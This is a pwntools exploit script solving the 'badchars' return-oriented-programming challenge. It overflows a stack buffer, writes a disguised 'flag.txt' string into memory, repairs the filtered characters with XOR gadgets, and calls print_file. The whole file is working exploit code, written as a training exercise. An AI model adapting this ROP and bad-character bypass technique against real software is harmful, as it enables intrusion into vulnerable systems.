#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
from warnings import filterwarnings

# Set up pwntools for the correct architecture
exe = context.binary = ELF('badchars')

filterwarnings("ignore")
context.log_level = 'debug'

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE: 
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
init-pwndbg
break *pwnme+268
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

def init():
    global io

    io = start()

def check(payload):
    badchars_list = ['x', 'g', 'a', '.']

    for chars in payload:
        assert chars not in badchars_list, "[*] Bad chars found :("
    
    info("[*] Payload Safe")

def generate_name():
    pop_r14_r15 = 0x00000000004006a0 # pop r14; pop r15; ret; 
    xor_r15_r14 = 0x0000000000400628 # xor byte ptr [r15], r14b; ret; 
    
    """
    Write flag.txt to memory in place by using rop gadgets

    First portion changes file_name[6] to 'x' by xoring 0x39 with it's current value which is ord('A')

    Reason I did that first is because the program tends to reach the badchar check if I do that last but it has no problem with me changing 'x, g, a' from memory
    """
    payload = p64(pop_r14_r15)
    payload += p64(0x39)
    payload += p64(file_addr+0x6)
    payload += p64(xor_r15_r14)

    payload += p64(pop_r14_r15)
    payload += p64(0x20)
    payload += p64(file_addr+0x2)
    payload += p64(xor_r15_r14)
    payload += p64(pop_r14_r15)
    payload += p64(0x26)
    payload += p64(file_addr+0x3)
    payload += p64(xor_r15_r14)
    payload += p64(pop_r14_r15)
    payload += p64(0x6f)
    payload += p64(file_addr+0x4)
    payload += p64(xor_r15_r14)


    return payload

def badchars():
    global file_addr
    offset = 40
    file_addr = exe.sym['__bss_start']
    pop_rdi = 0x00000000004006a3 # pop rdi; ret;
    write_what_where = 0x0000000000400634 # mov qword ptr [r13], r12; ret;
    pop_r12_r13_r14_r15 = 0x000000000040069c # pop r12; pop r13; pop r14; pop r15; ret; 

    payload = b'A' * offset
    payload += p64(pop_r12_r13_r14_r15)
    payload += b'flAAAtAt'
    payload += p64(file_addr)
    payload += p64(0x0)
    payload += p64(0x0)
    payload += p64(write_what_where)
    payload += generate_name()
    payload += p64(pop_rdi)
    payload += p64(file_addr)
    payload += p64(exe.plt['print_file'])

    check(payload)
    
    io.sendafter(b'>', payload)
    io.recvuntil('you!')
    io.recvline()
    flag = io.recv(1024).decode()
    info(f"Flag: {flag}")

    io.close()

def main():
    
    init()
    badchars()

if __name__ == '__main__':
    main()